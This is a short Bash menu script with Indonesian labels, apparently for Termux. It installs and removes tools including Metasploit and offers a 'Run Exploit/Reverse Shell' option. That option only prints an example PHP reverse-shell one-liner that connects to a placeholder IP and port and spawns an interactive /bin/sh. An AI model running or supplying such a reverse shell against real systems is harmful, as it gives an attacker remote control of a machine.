#!/bin/bash

# Warna
merah='\e[31m'
hijau='\e[32m'
kuning='\e[33m'
biru='\e[34m'
ungu='\e[35m'
reset='\e[0m'

# Informasi script
NAMA="BEBEK"
GITHUB="https://github.com/andizhuu/bebek-repo"
KONTAK="t.me/andizhuu"

# Cek dialog
if ! command -v dialog &> /dev/null; then
  echo -e "${kuning}Menginstall dialog...${reset}"
  pkg install dialog -y
fi

# Fungsi menu
function show_menu() {
  while true; do
    pilihan=$(dialog --clear --backtitle "BEBEK REPO MENU" \
      --title "Selamat Datang, $NAMA 🦆" \
      --menu "Pilih fitur:" 15 50 6 \
      1 "Install Tools" \
      2 "Uninstall Tools" \
      3 "Run Exploit/Reverse Shell" \
      4 "Tentang Script Ini" \
      5 "Kontak Developer" \
      0 "Keluar" \
      3>&1 1>&2 2>&3)

    case $pilihan in
      1) install_tools ;;
      2) uninstall_tools ;;
      3) run_exploit ;;
      4) about_script ;;
      5) contact ;;
      0) clear; echo "Bye $NAMA!"; exit ;;
      *) echo "Pilihan tidak valid." ;;
    esac
  done
}

function install_tools() {
  clear
  echo -e "${biru}Menginstall tools penting...${reset}"
  pkg update -y && pkg upgrade -y
  pkg install python git curl wget php openssh -y
  pkg install metasploit -y
  echo -e "${hijau}Install selesai!${reset}"
  sleep 2
}

function uninstall_tools() {
  clear
  echo -e "${merah}Menghapus tools...${reset}"
  pkg uninstall python git curl wget php openssh metasploit -y
  echo -e "${merah}Uninstall selesai!${reset}"
  sleep 2
}

function run_exploit() {
  clear
  echo -e "${ungu}Menjalankan mode exploit...${reset}"
  echo -e "${kuning}Contoh reverse shell: php -r '\$sock=fsockopen(\"IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'${reset}"
  echo -e "${biru}Fitur lanjutan bisa ditambahkan di sini...${reset}"
  sleep 4
}

function about_script() {
  dialog --msgbox "Script dibuat oleh $NAMA\nRepo: $GITHUB" 10 40
}

function contact() {
  dialog --msgbox "Hubungi saya di:\n$KONTAK" 10 40
}

# Mulai program
show_menu
